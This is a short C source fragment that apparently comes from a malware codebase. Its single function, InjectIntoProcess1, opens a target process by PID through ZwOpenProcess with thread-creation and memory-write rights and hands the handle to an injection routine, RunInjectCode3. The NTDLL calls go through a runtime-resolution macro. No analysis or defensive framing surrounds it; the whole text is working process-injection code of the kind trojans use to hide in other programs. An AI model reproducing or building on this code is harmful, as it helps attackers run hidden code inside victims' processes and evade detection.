#include "core\injects.h"

bool InjectIntoProcess1( DWORD pid, typeFuncThread func )
{
	bool ret = false;
	OBJECT_ATTRIBUTES oa;
	Mem::Zero(oa);
	oa.uLength = sizeof(OBJECT_ATTRIBUTES);

	CLIENT_ID clientID;
	clientID.UniqueProcess = (HANDLE)pid;
	clientID.UniqueThread  = 0;

	HANDLE hprocess;
		
	if ( API(NTDLL, ZwOpenProcess)( &hprocess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &oa, &clientID ) == STATUS_SUCCESS )
	{
		ret = RunInjectCode3( hprocess, 0, func, InjectCode );
		API(NTDLL, ZwClose)(hprocess);
	}

	return ret;
}
